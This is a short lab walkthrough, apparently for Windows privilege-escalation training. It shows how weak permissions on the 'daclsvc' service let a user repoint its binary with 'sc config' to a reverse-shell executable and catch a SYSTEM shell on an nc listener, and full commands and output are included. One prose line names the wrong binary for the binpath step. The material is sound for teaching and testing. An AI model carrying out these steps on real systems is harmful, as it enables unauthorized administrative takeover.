## Service Exploits - Insecure Service Permissions
- use `accesschk.exe` the `user` account permission on `daclsvc` service
- run the command `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
```
C:\PrivEsc>.\accesschk.exe /accepteula -uwcqv user daclsvc

.\accesschk.exe /accepteula -uwcqv user daclsvc

RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\PrivEsc>
```
- if you find out that the user has the permission to change the service config, then you can run `sc qc daclsvc`

```
C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
- And therefore you can run `sc config daclsvc binpath="\"C:\PrivEsc\accesschk.exe\"".

```

C:\PrivEsc>sc config daclsvc binpath="\"C:\PrivEsc\reverse_system.exe\""
sc config daclsvc binpath="\"C:\PrivEsc\reverse_system.exe\""
[SC] ChangeServiceConfig SUCCESS

C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\PrivEsc\reverse_system.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>

```
- if you have a listener on kali, you can spawn a reverse shell with SYSTEM privileges
- `net start daclsvc`  
```

└─$ nc -lnvp 54       
listening on [any] 54 ...
connect to [10.18.112.115] from (UNKNOWN) [10.10.90.125] 49827
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

C:\Windows\system32>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\PrivEsc\reverse_system.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\Windows\system32>

```



